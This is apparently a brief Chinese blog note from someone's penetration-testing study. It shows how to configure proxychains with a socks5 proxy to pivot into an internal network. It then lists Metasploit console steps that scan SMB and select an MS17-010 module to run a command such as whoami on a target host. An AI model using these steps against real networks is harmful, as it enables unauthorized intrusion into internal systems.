<p>PS：在对内网进行攻击时，都需要使用proxychains配置一下代理</p>
<h2 id="proxychains配置"><a href="#proxychains配置" class="headerlink" title="proxychains配置"></a>proxychains配置</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains4.conf</span><br></pre></td></tr></table></figure>

<p>配置了proxychains以后可以将端口转发进内网</p>
<p>使用proxychains配置一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socks5  xxxx.xxx.xxx.xxx port</span><br></pre></td></tr></table></figure>

<p>然后使用代理进入执行命令<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220315192328.png" alt="img" style="zoom:67%;"></p>
<h2 id="msf指令"><a href="#msf指令" class="headerlink" title="msf指令"></a>msf指令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search smb_version </span><br><span class="line">#搜索模块</span><br><span class="line">use 0</span><br><span class="line">#选择0号模块</span><br><span class="line">set RHOSTS XXX.XXX.XXX.XXX </span><br><span class="line">#设置访问内网主机ip</span><br><span class="line">search ms17</span><br><span class="line">#查看ms17模块能执行什么命令</span><br><span class="line">use 5</span><br><span class="line">#使用5号功能</span><br><span class="line">show options</span><br><span class="line">#显示 模块的options能执行什么</span><br><span class="line">set RHOSTS XXX.XXX.XXX.XXX </span><br><span class="line">#设置目标主机</span><br><span class="line">set COMMAND whoami</span><br><span class="line">执行命令</span><br></pre></td></tr></table></figure>
